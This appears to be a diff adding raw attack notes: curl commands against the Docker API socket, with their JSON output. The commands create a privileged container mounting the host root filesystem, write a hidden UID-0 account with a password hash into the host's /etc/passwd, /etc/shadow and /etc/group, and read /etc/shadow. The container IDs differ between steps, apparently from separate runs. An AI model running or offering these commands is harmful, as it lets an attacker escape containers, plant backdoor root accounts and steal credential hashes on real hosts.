@@ -1,0 +1,16 @@
+curl --insecure -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/containers/create?name=test2 -d '{"Image":"sandbox", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}' | cut -d: -f2 | cut -c 2-5
+
+{"Id":"5ac187609fc6376e4a29e50111f589f6b205a8ae32c0889a638968ef7979be16","Warnings":[]}
+
+curl --insecure -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/containers/4e31/start?name=test2
+
+curl --insecure --unix-socket /var/run/docker.sock http://localhost/containers/4e31/exec -X POST -H "Content-Type: application/json" -d "{ \"AttachStdin\": false, \"AttachStdout\": true, \"AttachStderr\": true, \"Cmd\": [\"/bin/sh\",\"-c\",\"echo 'ds2:x:0:0:Hidle,,,:/root:/bin/bash' >> /mnt/etc/passwd ; echo 'ds2:\$6\$rU8Vq2aztTvx6FT8\$WNeoWmMGe3CGEXYid6c2oUqy1rXuo2nLpyQpywECLM5FlUZo7hp6TBPZyHeDMohPamrDKprK5C5zO3gbEYrc20:18582:0:99999:7:::' >> /mnt/etc/shadow ; echo 'ds2:x:0:' >> /mnt/etc/group ; cat /mnt/etc/shadow\"]}"
+
+{"Id":"b0ed7092249e1343afd5497941053ffac89ede673de394948aa5f42057b9a332"}
+
+curl --insecure --unix-socket /var/run/docker.sock http://localhost/exec/66dbfdbdc11de00d59c807126390fc2d167a8b6740c97aaed996048e4183292e/start -X POST -H "Content-Type: application/json" -d '{}' --output -
+
+
+
+
+curl --insecure --unix-socket /var/run/docker.sock http://localhost/containers/2f2a/exec -X POST -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh","-c","cat /mnt/etc/shadow"]}'
